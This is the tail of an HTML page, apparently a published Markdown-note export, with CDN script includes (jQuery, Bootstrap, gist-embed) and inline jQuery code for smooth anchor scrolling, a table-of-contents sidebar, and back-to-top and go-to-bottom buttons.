    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.1.1/jquery.min.js" integrity="sha256-hVVnYaiADRTO2PzUGmuLJr8BLUSjGIZsDYGmIJLv2b8=" crossorigin="anonymous"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/twitter-bootstrap/3.3.7/js/bootstrap.min.js" integrity="sha256-U5ZEeKfGNOja007MMD3YBI0A3OSZOQbeG6z2f2Y0hu8=" crossorigin="anonymous" defer></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/gist-embed/2.6.0/gist-embed.min.js" integrity="sha256-KyF2D6xPIJUW5sUDSs93vWyZm+1RzIpKCexxElmxl8g=" crossorigin="anonymous" defer></script>
    <script>
        var markdown = $(".markdown-body");
        //smooth all hash trigger scrolling
        function smoothHashScroll() {
            var hashElements = $("a[href^='#']").toArray();
            for (var i = 0; i < hashElements.length; i++) {
                var element = hashElements[i];
                var $element = $(element);
                var hash = element.hash;
                if (hash) {
                    $element.on('click', function (e) {
                        // store hash
                        var hash = this.hash;
                        if ($(hash).length <= 0) return;
                        // prevent default anchor click behavior
                        e.preventDefault();
                        // animate
                        $('body, html').stop(true, true).animate({
                            scrollTop: $(hash).offset().top
                        }, 100, "linear", function () {
                            // when done, add hash to url
                            // (default click behaviour)
                            window.location.hash = hash;
                        });
                    });
                }
            }
        }

        smoothHashScroll();
        var toc = $('.ui-toc');
        var tocAffix = $('.ui-affix-toc');
        var tocDropdown = $('.ui-toc-dropdown');
        //toc
        tocDropdown.click(function (e) {
            e.stopPropagation();
        });

        var enoughForAffixToc = true;

        function generateScrollspy() {
            $(document.body).scrollspy({
                target: ''
            });
            $(document.body).scrollspy('refresh');
            if (enoughForAffixToc) {
                toc.hide();
                tocAffix.show();
            } else {
                tocAffix.hide();
                toc.show();
            }
            $(document.body).scroll();
        }

        function windowResize() {
            //toc right
            var paddingRight = parseFloat(markdown.css('padding-right'));
            var right = ($(window).width() - (markdown.offset().left + markdown.outerWidth() - paddingRight));
            toc.css('right', right + 'px');
            //affix toc left
            var newbool;
            var rightMargin = (markdown.parent().outerWidth() - markdown.outerWidth()) / 2;
            //for ipad or wider device
            if (rightMargin >= 133) {
                newbool = true;
                var affixLeftMargin = (tocAffix.outerWidth() - tocAffix.width()) / 2;
                var left = markdown.offset().left + markdown.outerWidth() - affixLeftMargin;
                tocAffix.css('left', left + 'px');
            } else {
                newbool = false;
            }
            if (newbool != enoughForAffixToc) {
                enoughForAffixToc = newbool;
                generateScrollspy();
            }
        }
        $(window).resize(function () {
            windowResize();
        });
        $(document).ready(function () {
            windowResize();
            generateScrollspy();
        });

        //remove hash
        function removeHash() {
            window.location.hash = '';
        }

        var backtotop = $('.back-to-top');
        var gotobottom = $('.go-to-bottom');

        backtotop.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            if (scrollToTop)
                scrollToTop();
            removeHash();
        });
        gotobottom.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            if (scrollToBottom)
                scrollToBottom();
            removeHash();
        });

        var toggle = $('.expand-toggle');
        var tocExpand = false;

        checkExpandToggle();
        toggle.click(function (e) {
            e.preventDefault();
            e.stopPropagation();
            tocExpand = !tocExpand;
            checkExpandToggle();
        })

        function checkExpandToggle () {
            var toc = $('.ui-toc-dropdown .toc');
            var toggle = $('.expand-toggle');
            if (!tocExpand) {
                toc.removeClass('expand');
                toggle.text('Expand all');
            } else {
                toc.addClass('expand');
                toggle.text('Collapse all');
            }
        }

        function scrollToTop() {
            $('body, html').stop(true, true).animate({
                scrollTop: 0
            }, 100, "linear");
        }

        function scrollToBottom() {
            $('body, html').stop(true, true).animate({
                scrollTop: $(document.body)[0].scrollHeight
            }, 100, "linear");
        }
    </script>
</body>

</html>
